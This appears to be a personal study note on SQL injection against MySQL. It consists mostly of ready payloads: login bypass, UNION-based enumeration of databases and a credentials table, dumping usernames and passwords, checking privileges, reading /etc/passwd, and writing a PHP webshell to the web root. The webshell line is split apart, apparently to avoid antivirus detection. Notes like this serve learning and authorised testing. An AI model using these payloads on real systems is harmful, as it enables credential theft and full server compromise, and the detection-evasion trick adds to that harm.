#SQLi #SQLinjection #injection

- A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database.
-  In the most basic case, this is done by injecting a single quote (') or a double quote (") to escape the limits of user input and inject data directly into the SQL query.
- [ISO/IEC 9075 - Wikipedia](https://en.wikipedia.org/wiki/ISO/IEC_9075) ISO standard for SQL languages
- [[MySQL]]
	- [MySQL :: MySQL 8.0 Reference Manual :: 15.7.7.21 SHOW GRANTS Statement](https://dev.mysql.com/doc/refman/8.0/en/show-grants.html) SHOW GRANTS is used to see user Privs
	- Use copilot for customized queries
- `SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';` classic 1=1 bypass
- `SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';` classic commenting out rest of query
- `SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '` use a union select to grab extra data from a different table or database
- `SELECT * FROM employees UNION SELECT dept_no, dept_name, NULL, NULL, NULL, NULL FROM departments;` union select when tables have different columns
- `' order by 1-- -` see if data changes, try different numbers to see how many columns exist
- `cn' UNION select 1,@@version,3,4-- -` use one of the extra columns to grab data, such as SQL server version
- `SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;` or `show databases;` to gather information on accessible databases
- `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` get a list of databases
- `cn' UNION select 1,database(),3,4-- -` current database in use
- `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` get a list of tables from the **dev** database
- `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` get a list of the column names in the **credentials** table
- `cn' UNION select 1, username, password, 4 from dev.credentials-- -` query for row data from the **dev** database **credentials** table
- `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -` what are my privs
- `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` show privs for user **root**
- `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` check privs on local root account
- `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` if current user has load file privs, load **/etc/passwd**
- `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` can current user read/write local files
- `cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -` take results and send to file
- `cn' union select "",'<?php system($` `_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/` `shell.php'-- -` (split because defender doesnt like it) write out a **webshell**


|Payload|When to Use|Expected Output|Wrong Output|
|---|---|---|---|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|